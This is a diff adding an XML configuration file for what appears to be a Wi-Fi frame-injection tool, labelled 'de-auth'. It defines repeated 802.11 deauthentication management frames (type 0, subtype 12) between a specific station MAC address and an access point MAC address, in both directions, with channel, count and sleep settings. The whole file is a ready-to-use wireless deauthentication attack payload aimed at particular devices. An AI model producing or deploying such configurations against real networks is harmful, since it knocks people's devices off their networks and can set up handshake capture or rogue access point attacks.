@@ -1,0 +1,55 @@
+<?xml version="1.0" ?>                                                
+
+<list>
+	<default>
+		<desc>de-auth</desc>
+		<channel>1</channel>
+		<count>10</count>
+		<sleep>10000</sleep>
+	</default>
+
+	<!-- STA block -->
+	<airconf>
+        	<type>0</type>
+	        <subtype>12</subtype>
+	        <ds tods="0" fromds="1" />
+	        <addr count="3">
+	                   <da>58:40:4e:71:7e:0c</da>
+	                   <sa>9c:1c:12:97:10:80</sa>
+            		<bssid>9c:1c:12:97:10:80</bssid>
+        	</addr>
+	</airconf>
+	<airconf>
+        	<type>0</type>
+	        <subtype>12</subtype>
+	        <ds tods="0" fromds="0" />
+	        <addr count="3">
+	                   <da>58:40:4e:71:7e:0c</da>
+	                   <sa>9c:1c:12:97:10:80</sa>
+            		<bssid>9c:1c:12:97:10:80</bssid>
+        	</addr>
+	</airconf>
+
+
+	<!-- AP block -->
+	<airconf>
+        	<type>0</type>
+	        <subtype>12</subtype>
+	        <ds tods="1" fromds="0" />
+	        <addr count="3">
+	                   <da>9c:1c:12:97:10:80</da>
+	                   <sa>58:40:4e:71:7e:0c</sa>
+            		<bssid>9c:1c:12:97:10:80</bssid>
+        	</addr>
+	</airconf>
+	<airconf>
+        	<type>0</type>
+	        <subtype>12</subtype>
+	        <ds tods="0" fromds="0" />
+	        <addr count="3">
+	                   <da>9c:1c:12:97:10:80</da>
+	                   <sa>58:40:4e:71:7e:0c</sa>
+            		<bssid>9c:1c:12:97:10:80</bssid>
+        	</addr>
+	</airconf>
+</list>
